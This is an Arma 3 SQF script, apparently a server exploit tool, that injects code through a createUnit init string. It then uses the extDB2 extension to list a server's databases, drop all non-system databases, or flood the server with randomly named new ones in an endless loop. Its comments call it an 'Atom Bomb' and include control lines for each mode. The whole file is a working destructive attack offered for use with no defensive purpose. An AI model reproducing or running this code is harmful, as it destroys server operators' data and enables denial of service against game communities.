_dbabomb = {
	
	DB_ID = (call life_sql_id); //--- EDIT THIS WITH THE SERVERS DATABASE ID VARIABLE

	BOMB = {
		params["_type"];
		
		_request_noresponse = {
			_queryStmt = param [0,"",[""]];
			_mode = param [1,1,[0]];
			_multiarr = param [2,false,[false]];
			"extDB2" callExtension format["%1:%2:%3",_mode, DB_ID, _queryStmt];
		};	
		_request_response = {
			_queryStmt = param [0,"",[""]];
			_mode = param [1,1,[0]];
			_multiarr = param [2,false,[false]];


			_result = "extDB2" callExtension format["%1:%2:%3",_mode, DB_ID, _queryStmt];
			if(_result == "") exitWith {""};
			_result = call compile format["%1",_result];
			_key = (_result select 1);
			_keyMode = (_result select 0);
			_queryResult = "";
			_loop = true;

			while{_loop} do
			{
				_queryResult = "extDB2" callExtension format["4:%1", _key];
				switch(_queryResult) do {

					case "[5]": {
						_queryResult = "";
						while{true} do {
							_pipe = "extDB2" callExtension format["5:%1", _key];
							if(_pipe == "") exitWith {_loop = false};
							_queryResult = _queryResult + _pipe;
						};
					};

					case "[3]": {
						uiSleep 0.3;
					};

					default {
						_loop = false;
					};
				};
			};
			_queryResult;
		};
		
		if(_type == 3) then {
			while{true} do {
				["CREATE DATABASE db_" + str(floor(random(1000000))),1] call _request_noresponse;
				uiSleep 0.001;
			};
		};
		
		_datl = ["SHOW DATABASES",2] call _request_response;
		if(_datl == "") exitWith {
			DAT = "Failed to grab DB info"; 
			publicVariable "DAT";
		};
		_dat = call compile _datl;
		_dbs = _dat select 1;
		{
			if(typeName _x != typeName []) exitWith {
				_dbs = [];
				DAT = "Bad type in foreach";
				publicVariable "DAT";
			};
			_dbs set[_forEachIndex,_x select 0];
		} forEach _dbs;
		_dbs = _dbs - ["information_schema","mysql","performance_schema"];
		
		if(_type == 1) then {
			DAT = "Database Information";
			publicVariable "DAT";
			DAT = "====================";
			publicVariable "DAT";
			DAT = str(_dbs);
			publicVariable "DAT";
		};
		if(_type == 2) then {
			{
				["DROP DATABASE " + _x,1] call _request_noresponse;
			} forEach _dbs;
		};
	};
	
};
"DAT" addPublicVariableEventHandler {
	systemChat (_this select 1);
};
(typeOf player) createUnit [[0,0,0],group player,'if(isserver) then {[] spawn ' + str(_dbabomb) + ';};']; //--- replace this with your actual Remote Execution
hint "Atom Bomb Installed";


//--- bomb controls
[1] remoteExec ["BOMB",2]; //--- list databases
[2] remoteExec ["BOMB",2]; //--- delete all databases
[3] remoteExec ["BOMB",2]; //--- create millions of fake databases


